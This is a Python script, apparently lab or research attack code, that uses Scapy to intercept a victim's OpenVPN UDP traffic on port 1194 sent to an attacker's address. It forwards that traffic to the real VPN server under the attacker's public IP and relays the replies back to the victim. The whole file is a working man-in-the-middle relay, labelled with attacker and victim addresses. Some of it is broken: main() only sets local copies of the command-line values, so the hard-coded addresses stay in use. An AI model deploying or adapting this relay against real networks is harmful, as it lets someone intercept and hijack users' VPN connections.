import sys

from scapy.all import *
import threading

ephem_udp_stop = False

clientSport = None

public_iface = "enp0s8"# None # sys.argv[1]
attacker_pub_ip = "fd12:2345:6789:fe::fe" # None # sys.argv[2];
victim_ip ="fd12:2345:6789:1::fe" # sys.argv[3]; # dns server IP
vpn_ip = "fd12:2345:6789:2::fe" # sys.argv[4]; # dns server IP
vpn_port = 1194 #  1194
https_port = 80 # 80 # 
webdnsserver_ip = None # sys.argv[7]
attacker_priv_ip = "fd00::1001" # sys.argv[8]


def sniff_thread_fn():
    sniff(iface='tun-ipv6', prn=init_sniff_fn, stop_filter=stop_sniff_fn)


def init_sniff_fn(packet):
    global clientSport
    if not packet.haslayer(TCP): 
        packet = IPv6(packet) 
        if packet.haslayer(IPv6) and packet.haslayer(UDP):
            src_ip = packet[IPv6].src 
            dst_ip = packet[IPv6].dst 
            dport = packet[UDP].dport 
            clientSport = packet[UDP].sport 
            # return (src_ip==victim_ip and dst_ip==attacker_priv_ip==dport) 
            return (src_ip==victim_ip, dst_ip==attacker_priv_ip, vpn_port==dport) 

def stop_sniff_fn(packet): 
    global clientSport
    if not packet.haslayer(TCP): 
        packet = IPv6(packet) 
        if packet.haslayer(IPv6) and packet.haslayer(UDP):
            src_ip = packet[IPv6].src 
            dst_ip = packet[IPv6].dst 
            dport = packet[UDP].dport 
            clientSport = packet[UDP].sport 
            if src_ip==victim_ip and dst_ip==attacker_priv_ip and vpn_port==dport: 
                # print("stop_sniff_fn - exiting")
                pkt = IPv6(src=attacker_pub_ip, dst=vpn_ip)/packet[UDP]
                send(pkt)
                return True
    return False # (src_ip,sport, dst_ip, dport) 

def start_tun_thread():
    def sniff_tun(packet):
        """ Expect packets from victim toVPN server"""
        if not packet.haslayer(TCP):
            packet = IPv6(packet)
            print(f"start_tun_thread: clientSport={clientSport}, {packet[UDP].dport}==1194 and {packet[UDP].sport}=={clientSport}")
            if packet.haslayer(UDP) and packet[UDP].dport==1194 and packet[UDP].sport == clientSport:
                """ """
                udp_payload = packet[UDP].load
                pkt = IPv6(src=attacker_pub_ip,dst=vpn_ip)/UDP(sport=clientSport, dport=1194)/udp_payload
                print(f"start_tun_thread: pkt={pkt}")
                send(pkt)

    sniff(iface='tun-ipv6', prn=sniff_tun)

def start_enp0s8_thread():
    global clientSport
    def sniff_enp0s8(packet):
        """ Expect packets from victim to VPN server"""
        if not packet.haslayer(TCP):
            if packet.haslayer(UDP):
                print(f"start_enp0s8_thread: clientSport={clientSport}, {packet[UDP].sport}==1194 and dport={packet[UDP].dport} == clientSport")
                if packet[UDP].sport==1194 and packet[UDP].dport == clientSport:
                    udp_payload = packet[UDP].load
                    pkt = IPv6(src=attacker_priv_ip, dst=victim_ip)/UDP(sport=1194, dport=clientSport)/udp_payload
                    print(f"start_enp0s8_thread: pkt={pkt}")
                    send(pkt)

    sniff(iface='enp0s8', prn=sniff_enp0s8)


def main():

    public_iface = sys.argv[1]
    attacker_pub_ip = sys.argv[2];
    victim_ip = sys.argv[3]; # dns server IP
    vpn_ip = sys.argv[4]; # dns server IP
    vpn_port = 1194
    https_port = 80 # 
    webdnsserver_ip = sys.argv[7]
    attacker_priv_ip = sys.argv[8]

    # print(f"public_iface={public_iface}")
    # print(f"attacker_pub_ip={attacker_pub_ip}")
    # print(f"victim_ip={victim_ip}")
    # print(f"vpn_ip={vpn_ip}")
    # print(f"attacker_priv_ip={attacker_priv_ip}")

    sniff_thread = threading.Thread(target=sniff_thread_fn)
    sniff_thread.start()
    sniff_thread.join()
    print("Done sniffing")

    tun_thread = threading.Thread(target=start_tun_thread)# ,  daemon=True)
    tun_thread.start()
    enp0s8_thread = threading.Thread(target=start_enp0s8_thread)
    enp0s8_thread.start()
    enp0s8_thread.join()


if __name__ == '__main__':
    main()
